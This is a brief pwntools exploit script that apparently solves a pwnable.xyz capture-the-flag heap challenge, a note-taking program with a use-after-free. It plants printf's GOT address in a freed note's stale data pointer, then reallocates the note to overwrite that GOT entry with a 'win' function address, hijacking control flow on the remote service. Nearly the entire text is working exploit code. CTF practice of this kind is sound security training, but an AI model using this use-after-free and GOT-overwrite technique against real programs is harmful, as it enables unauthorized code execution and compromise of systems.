###Uninitialized data after UAF
###Some really strange logic in delete, may allow fastbin dup, but not used here so to hell with it

from pwn import *

###Structure
'''
meta
    |   8   |   8   |
0x00|     title     |
0x10|     title     |
0x20|dataptr|
'''

###Util
def create(size,title,data):
    r.sendlineafter('> ','1')
    r.sendlineafter('note: ',str(size))
    r.sendafter('title: ',title)
    r.sendafter('note: ',data)

def delete(idx):
    r.sendlineafter('> ','3')
    r.sendlineafter('Note#: ',str(idx))

###Addr
win = 0x40096c
printf_got = 0x602040

###Exploit
r = remote('svc.pwnable.xyz',30030)
create(0x28,'M30W',b'a'*0x20+p64(printf_got)[:-1])
delete(0)
create(0x28,'M30W',p64(win))

r.interactive()
